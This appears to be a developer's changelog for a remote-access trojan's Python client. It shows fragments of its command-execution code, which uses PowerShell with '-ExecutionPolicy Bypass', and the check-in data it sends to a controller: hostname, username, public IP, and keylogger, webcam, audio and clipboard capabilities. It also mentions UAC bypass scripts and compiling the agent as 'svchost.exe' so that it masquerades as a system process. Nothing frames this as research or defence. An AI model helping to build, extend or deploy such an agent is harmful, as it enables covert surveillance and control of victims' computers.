# PowerShell & UI v2.1 Update - Complete Guide

## ✅ What Was Updated

### 1. **CMD.exe → PowerShell Migration** 
All command execution now uses PowerShell instead of CMD.exe for better compatibility and features.

### 2. **Agent Data Format v2.1**
Updated agent registration to include comprehensive system information for the new controller UI.

---

## 📋 Changes Made to client.py

### **PowerShell Updates:**

#### **Before (CMD):**
```python
# Old CMD execution
subprocess.run([cmd_exe_path, "/c", "chcp 65001 >nul & " + command], ...)
subprocess.Popen(['cmd.exe', '/c', watchdog_path], ...)
os.environ['COMSPEC'] = cmd_path  # CMD.exe
```

#### **After (PowerShell):**
```python
# New PowerShell execution
subprocess.run([ps_exe_path, "-ExecutionPolicy", "Bypass", "-NoProfile", "-Command", command], ...)
subprocess.Popen(['powershell.exe', '-ExecutionPolicy', 'Bypass', '-NoProfile', '-File', watchdog_path], ...)
os.environ['COMSPEC'] = ps_path  # PowerShell
```

### **Agent Data v2.1 Format:**

#### **Before (Basic):**
```python
safe_emit('agent_connect', {'agent_id': agent_id})
```

#### **After (Comprehensive v2.1):**
```python
safe_emit('agent_connect', {
    'agent_id': agent_id,
    'hostname': socket.gethostname(),
    'platform': platform.system(),
    'os_version': platform.release(),
    'ip_address': get_local_ip(),
    'public_ip': get_public_ip(),
    'username': os.getenv('USERNAME') or os.getenv('USER') or 'unknown',
    'version': '2.1',
    'capabilities': {
        'screen': True,
        'camera': CV2_AVAILABLE,
        'audio': PYAUDIO_AVAILABLE,
        'keylogger': PYNPUT_AVAILABLE,
        'clipboard': True,
        'file_manager': True,
        'process_manager': PSUTIL_AVAILABLE,
        'webcam': CV2_AVAILABLE,
        'webrtc': AIORTC_AVAILABLE
    },
    'timestamp': int(time.time() * 1000)
})
```

---

## 🔄 Specific Changes

### **1. Command Execution (execute_command function)**
- ✅ Replaced `cmd.exe /c` with `powershell.exe -ExecutionPolicy Bypass -NoProfile -Command`
- ✅ Updated log messages from `[CMD]` to `[PS]`
- ✅ Auto-detection still works (Unix → Windows command translation)

### **2. WSL Routing**
- ✅ Updated COMSPEC to use PowerShell instead of CMD
- ✅ Log messages updated to reflect PowerShell usage

### **3. Registry Settings**
- ✅ Updated comments to mention PowerShell instead of CMD
- ✅ Ensures both CMD and PowerShell remain enabled

### **4. UAC Bypass Scripts**
- ✅ Updated registry bypass to use PowerShell commands
- ✅ More reliable execution with `-ExecutionPolicy Bypass`

### **5. Helper Functions Added**
```python
def get_local_ip():
    """Get local IP address."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return '127.0.0.1'

def get_public_ip():
    """Get public IP address."""
    try:
        if REQUESTS_AVAILABLE:
            import requests
            response = requests.get('https://api.ipify.org?format=json', timeout=3)
            return response.json()['ip']
    except:
        pass
    return 'unknown'
```

---

## 🚀 How to Apply Updates

### **Option 1: Use the Update Script (Easiest)**
```bash
python3 update_to_powershell_and_v2.1.py
```

### **Option 2: Recompile**
```cmd
# After the update script runs, recompile:
pyinstaller svchost.spec --clean --noconfirm

# Or use the batch file:
FIX_AND_COMPILE.bat
```

---

## 📊 Agent Data v2.1 Format

The controller UI v2.1 now receives:

| Field | Type | Description |
|-------|------|-------------|
| `agent_id` | string | Unique agent identifier (hostname) |
| `hostname` | string | Computer hostname |
| `platform` | string | OS platform (Windows/Linux/Darwin) |
| `os_version` | string | OS version/release |
| `ip_address` | string | Local IP address |
| `public_ip` | string | Public IP address |
| `username` | string | Current logged-in user |
| `version` | string | Agent version ("2.1") |
| `capabilities` | object | Feature availability flags |
| `timestamp` | number | Connection timestamp (ms) |

### **Capabilities Object:**
```json
{
  "screen": true,              // Screen capture
  "camera": true/false,        // Webcam (cv2 available)
  "audio": true/false,         // Audio (pyaudio available)
  "keylogger": true/false,     // Keylogging (pynput available)
  "clipboard": true,           // Clipboard access
  "file_manager": true,        // File operations
  "process_manager": true/false, // Process control (psutil)
  "webcam": true/false,        // Webcam streaming
  "webrtc": true/false         // WebRTC support (aiortc)
}
```

---

## ✅ Benefits

### **PowerShell Advantages:**
1. ✅ **Better Unicode Support** - No more encoding issues
2. ✅ **Modern Scripting** - More powerful than CMD
3. ✅ **Better Error Handling** - Clearer error messages
4. ✅ **Object-Based** - Returns structured data
5. ✅ **Built-in Tools** - No need for external utilities
6. ✅ **Bypass Execution Policy** - `-ExecutionPolicy Bypass` flag

### **v2.1 Format Advantages:**
1. ✅ **Rich Metadata** - More agent information displayed
2. ✅ **Capability Detection** - UI knows what agent can do
3. ✅ **IP Tracking** - Both local and public IPs
4. ✅ **Timestamp** - Precise connection time
5. ✅ **Better UX** - Controller can adapt UI based on capabilities

---

## 🔍 Verification

### **Check PowerShell Usage:**
```bash
# Search for remaining CMD references
grep -i "cmd\.exe" client.py
grep -i "\[CMD\]" client.py

# Should return minimal results (only in comments)
```

### **Test Agent Connection:**
1. Compile: `pyinstaller svchost.spec --clean --noconfirm`
2. Run: `dist\svchost.exe`
3. Check controller UI - should show v2.1 data:
   - Hostname
   - IP addresses
   - OS version
   - Capabilities
   - Timestamp

---

## 📝 Files Updated

1. ✅ **client.py** - Main agent code
   - PowerShell migration complete
   - v2.1 data format implemented
   - Helper functions added

2. ✅ **update_to_powershell_and_v2.1.py** - Update script
   - Automated migration tool
   - Regex-based replacements
   - Safe and reversible

---

## ⚠️ Important Notes

1. **PowerShell must be available** (default on Windows 7+)
2. **Controller must support v2.1 format** (check controller version)
3. **Backward compatibility** - Old controllers may not display all data
4. **No breaking changes** - Agent still works with older controllers

---

## 🐛 Troubleshooting

### **Issue: Commands not working**
**Fix:** Ensure PowerShell is not blocked by policy
```powershell
Set-ExecutionPolicy Bypass -Scope CurrentUser
```

### **Issue: v2.1 data not showing in controller**
**Fix:** Update controller to v2.1 or later

### **Issue: IP address shows 'unknown'**
**Fix:** Check internet connectivity for public IP
Check firewall for local network access

---

## 📄 Quick Reference

### **Compile After Update:**
```cmd
FIX_AND_COMPILE.bat
```

### **Manual Compile:**
```cmd
pyinstaller svchost.spec --clean --noconfirm
```

### **Verify Update:**
```bash
python3 update_to_powershell_and_v2.1.py
```

---

## ✅ Summary

| Component | Status | Description |
|-----------|--------|-------------|
| PowerShell Migration | ✅ Complete | All CMD → PowerShell |
| Agent Data v2.1 | ✅ Complete | Rich metadata format |
| Helper Functions | ✅ Added | IP detection utilities |
| Documentation | ✅ Complete | This guide |
| Backward Compat | ✅ Maintained | Works with old controllers |

---

**Everything is ready! Recompile and test with controller UI v2.1!** 🚀
